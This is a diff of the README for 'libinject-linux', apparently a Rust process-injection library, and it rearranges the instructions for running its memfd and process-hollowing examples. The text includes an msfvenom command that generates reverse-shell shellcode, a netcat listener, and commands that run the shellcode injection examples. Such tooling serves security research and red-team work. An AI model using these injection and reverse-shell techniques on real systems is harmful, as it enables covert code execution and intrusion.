@@ -28,18 +28,12 @@ cd libinject-linux
 ```
 
 ### memfd
-Run the example
+Run the memfd example with an ELF file
 ```bash
 cargo run --example memfd_executable
 ```
 
-or the shellcode example
-```bash
-cargo run --example memfd_shellcode
-```
-
-### hollow
-Use your own shellcode or the provided example
+Run the memfd example with the provided shelcode or use your own:
 ```bash
 msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
 ```
@@ -51,7 +45,13 @@ nc -lvnp 1234
 
 Run the example
 ```bash
-cargo run --example hollow
+cargo run --example memfd_shellcode
+```
+
+### hollow
+Run the hollow example with shellcode
+```bash
+cargo run --example hollow_shellcode
 ```
 
 ## Acknowledgments
